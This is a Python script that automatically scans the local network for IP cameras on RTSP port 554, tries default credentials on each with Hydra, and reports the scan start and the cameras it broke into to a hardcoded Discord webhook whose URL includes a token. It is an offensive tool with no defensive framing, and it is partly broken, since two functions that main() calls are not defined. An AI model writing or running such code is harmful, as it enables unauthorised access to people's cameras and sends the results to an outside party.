import socket
import ipaddress
import concurrent.futures
import subprocess
import sys
import time
import logging
import argparse
import requests

# Speed map for controlling the thread pool
speed_map = {
    'very slow': 10,
    'normal': 50,
    'fast': 100,
    'very fast': 200,
    'max': 1500
}

# Webhook URL (modify with your webhook URL)
WEBHOOK_URL = "https://discord.com/api/webhooks/1202612758026129448/POjuRyTcEZsWXOzr53H5vw9IxwvJMPMIhJ89JBxizIDbBXajZGb5z9f_mkACR5pQN06u"

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to send logs to a webhook
def send_logs_to_webhook(message):
    try:
        payload = {"content": message}
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            logging.info("Logs successfully sent to the webhook.")
        else:
            logging.error(f"Failed to send logs to the webhook. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error sending logs to webhook: {e}")

# Function to get local IP using ifconfig without specifying interface
def get_local_ip_from_ifconfig():
    try:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line and '127.0.0.1' not in line:
                ip = line.split()[1]
                return ip
    except Exception as e:
        logging.error(f"Error running ifconfig: {e}")
        return None

# Function to check Wi-Fi connection
def wait_for_wlan0():
    while True:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        if 'wlan0' in result.stdout:
            logging.info("wlan0 interface is detected.")
            break
        else:
            logging.info("wlan0 not found, waiting for it to become available...")
            time.sleep(5)

# Function to scan an individual port
def scan_port(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((str(ip), port))
            return ip
    except:
        return None

# Function to scan the entire network
def scan_network(network, port, speed_w):
    ips = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=speed_w) as executor:
        futures = [executor.submit(scan_port, ip, port) for ip in network.hosts()]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                ips.append(result)
    return ips

# Function to check camera credentials over RTSP using Hydra
def check_camera_credentials_with_hydra(ip, username="admin", password="123456"):
    command = f'hydra -l {username} -p {password} -vV rtsp://{ip}:554'
    logging.info(f"Checking RTSP credentials for {ip} using Hydra...")
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if "success" in result.stdout.lower():
        return True
    return False

# Function to fetch camera information
def fetch_camera_info(ip):
    try:
        urls = [
            f"http://{ip}/",
            f"http://{ip}/api/get_camera_info",
            f"http://{ip}/status",
        ]
        for url in urls:
            response = requests.get(url, timeout=3)
            if response.status_code == 200:
                return response.text  # Return the full response text for analysis
    except requests.exceptions.RequestException as e:
        logging.error(f"Error accessing {ip}: {e}")
    return "No additional information found."

# Auto scan mode
def auto_scan():
    send_logs_to_webhook("@everyone scan started!")
    wait_for_wlan0()
    local_ip = get_local_ip_from_ifconfig()
    if not local_ip:
        logging.error("Could not retrieve local IP. Exiting.")
        sys.exit(1)

    network_ip = ".".join(local_ip.split(".")[:-1]) + ".0"
    network = ipaddress.ip_network(f"{network_ip}/24")
    port = 554
    speed_w = speed_map["max"]

    logging.info(f"Auto-scanning network {network} for devices with port {port} open...")
    ips = scan_network(network, port, speed_w)

    successful_cameras = []
    failed_cameras = []

    if ips:
        logging.info(f"Found devices with port {port} open:")
        for ip in ips:
            logging.info(ip)
            if check_camera_credentials_with_hydra(str(ip)):
                logging.info(f"Camera at {ip} is enabled with default credentials.")
                successful_cameras.append(ip)
            else:
                logging.warning(f"Camera at {ip} failed to authenticate with default credentials.")
                failed_cameras.append(ip)
    else:
        logging.info(f"No devices found with port {port} open.")

    # Send scan results to the webhook
    scan_summary = f"Scan complete: Found {len(ips)} cameras. {len(successful_cameras)} working with default credentials, {len(failed_cameras)} failed."
    send_logs_to_webhook(scan_summary)

    logging.info(scan_summary)

# Argument parsing for better CLI options
def main():
    parser = argparse.ArgumentParser(description="Network Scanner Script with Webhook")
    parser.add_argument('-auto', action='store_true', help="Automatic network scan for IP cameras")
    parser.add_argument('-manual', action='store_true', help="Manual network scan with port selection")
    parser.add_argument('-info', action='store_true', help="Fetch information about successful cameras")
    args = parser.parse_args()

    if args.auto:
        auto_scan()
    elif args.manual:
        manual_scan()  # Manual scan option
    elif args.info:
        gather_camera_info()  # Gather camera information
    else:
        print("Usage: python smart.py -auto (for automatic scanning)")
        print("       python smart.py -manual (for manual port selection and speed)")
        print("       python smart.py -info (to gather information about successful cameras)")

if __name__ == "__main__":
    main()